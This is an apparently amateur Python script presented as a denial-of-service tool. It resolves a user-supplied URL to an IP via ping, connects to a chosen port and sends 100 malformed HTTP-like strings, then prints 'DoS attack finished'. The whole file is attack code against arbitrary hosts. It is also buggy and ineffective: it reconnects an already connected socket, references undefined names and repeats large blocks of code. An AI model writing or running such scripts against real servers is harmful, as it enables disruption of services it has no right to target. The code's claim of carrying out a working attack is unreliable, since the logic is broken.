import socket as sc
import time, subprocess, os

# Clear the console screen
os.system("cls")

# Function to perform a ping callback to a specified URL
def callback(url):
     
     # Execute the ping command and capture the output
     output = subprocess.run(f"ping {url}", check=True, capture_output=True, text=True)
     
     # Print the ping output
     print(output.stdout.split("\n"))
     print("-----------------------------------------------------------")
     
     # Extract the IP address from the ping output
     ip = output.stdout.split()[2][1:-1]
     print(f"ip address of significant url is {ip}")

     # Prompt the user to enter a port number
     port = int(input("Enter a port that you want>>> "))
     print(f"You selected port {port}")
     print("------------------------------------------------------------")

     # Create a socket object
     con = sc.socket(sc.AF_INET, sc.SOCK_STREAM)

     c = 0
     # Connect to the IP address and port
     con.connect((ip, port))
     port_status = con.connect_ex((ip, port))
     print(f"port status is {port_status}")
     
     # Send packets to the connected port
     for i in range(1, 101):
          pack = "red" * 20
          con.send(("GET / HTTP 1.1" + pack).encode())
          c += 1
          print("send packet", c)
          time.sleep(0.5)
     
     # Check if the DoS attack finished successfully
     if c == 100:
          print("DoS attack finished")
     else:
          print("Failed!")

     # Close the connection
     con.close()

# Function to reset the port and perform DoS attack
def reset_port():
     print(f"You selected port {new_port}")
     print("------------------------------------------------------------")

     # Create a socket object
     con = sc.socket(sc.AF_INET, sc.SOCK_STREAM)

     c = 0
     # Connect to the IP address and new port
     con.connect((ip, new_port))
     port_status = con.connect_ex((ip, new_port))
     print(f"port status is {port_status}")
     
     # Send packets to the connected port
     for i in range(1, 101):
          pack = "red" * 20
          con.send(("GET / HTTP 1.1" + pack).encode())
          c += 1
          print("send packet", c)
          time.sleep(0.5)
     
     # Check if the DoS attack finished successfully
     if c == 100:
          print("DoS attack finished")
     else:
          print("Failed!")

     # Close the connection
     con.close()

# Function to perform DoS attack on the specified port
def run():
     c = 0
     # Connect to the IP address and new port
     con.connect((ip, new_port))
     port_status = con.connect_ex((ip, new_port))
     print(f"port status is {port_status}")
     
     # Send packets to the connected port
     for i in range(1, 101):
          pack = "red" * 20
          con.send(("GET / HTTP 1.1" + pack).encode())
          c += 1
          print("send packet", c)
          time.sleep(0.5)
     
     # Check if the DoS attack finished successfully
     if c == 100:
          print("DoS attack finished")
     else:
          print("Failed!")

     # Close the connection
     con.close()

# Get a random URL input from the user
url = input("Enter a random url> ")

try:
     # Execute the ping command to the specified URL
     output = subprocess.run(f"ping {url}", capture_output=True, text=True, check=True)
     print(output.stdout.split('\n'))
     print("-----------------------------------------------------------")
     
     # Extract the IP address from the ping output
     ip = output.stdout.split()[2][1:-1]
     print(f"ip address of significant url is {ip}")

# Handle the case where an invalid URL is entered
except subprocess.CalledProcessError:
     print("The URL that you have entered may be invalid or doesn't exist")
     validated_url = input("Please enter a valid URL>>> ")
     try:
          callback(validated_url)
     except subprocess.CalledProcessError:
          print("You entered an invalid URL again \nPlease first check the URL and then enter it")
          validated_url = input("Input correct URL>>> ")
          callback(validated_url)

# Get a port input from the user
port = int(input("Enter a port that you want>>> "))
print(f"You selected port {port}")
print("------------------------------------------------------------")

# Create a socket object
con = sc.socket(sc.AF_INET, sc.SOCK_STREAM)

try:
     c = 0
     # Connect to the IP address and port
     con.connect((ip, port))
     time.sleep(1)
     port_status = con.connect_ex((ip, port))
     print(f"port status is {port_status}")
     
     # Send packets to the connected port
     for i in range(1, 101):
          pack = "red" * 20
          con.send(("GET / HTTP 1.1" + pack).encode())
          c += 1
          print("send packet", c)
          time.sleep(0.5)

     # Check if the DoS attack finished successfully
     print("DoS Attack Finished") if c == 100 else print("Failed!")
     
     # Close the connection
     con.close()

# Handle exceptions
except OverflowError:
     print("Input port must be a positive number, please try again")
     port = int(input("Input correct port>>> "))
     reset_port()

except TimeoutError as e:
     print("Establishing the connection...")

     c = 0
     try:
          # Create a socket object
          con = sc.socket(sc.AF_INET, sc.SOCK_STREAM)
          con.connect((ip, port))
          pack = "red" * 20
          
          # Send packets to the connected port
          for t in range(1, 101):
               con.send(("GET / HTTP 1.1" + pack).encode())
               c += 1
               print("Trying send", c)
               time.sleep(0.5)

          # Check if the DoS attack finished successfully
          print("DoS attack finished") if c == 100 else print("Failed")

          # Close the connection
          con.close()

     except TimeoutError:
          print(f"The connection hasn't been made and the error code is {e.winerror}")

except ConnectionAbortedError:
     if c == 100:
          print("DoS Attack Finished")
     else:
          print("Attack process wasn't finished")
          reset_port()

except ConnectionRefusedError:
     print("No connection could be established because the port was closed!")
     print("Please try again.")
     time.sleep(1)
     new_port = int(input("Input another port>>>> "))
     if new_port == port:
          print("You entered the same port")
          new_port = int(input("Please try another port>>> "))
          try:
               reset_port()
          except ConnectionRefusedError:
               c = 0
               con = sc.socket(sc.AF_INET, sc.SOCK_STREAM)
               con.connect((ip, new_port))
               for i in range(1, 101):
                    pack = "red" * 10
                    con.send(("GET / HTTP 1.1" + pack).encode())
                    c += 1
                    print("packet number", c)
                    time.sleep(0.5)

               # Check if the DoS attack finished successfully
               print("DoS Attack Finished") if c == 100 else print("Failed!")

               # Close the connection
               con.close()
     else:
          run()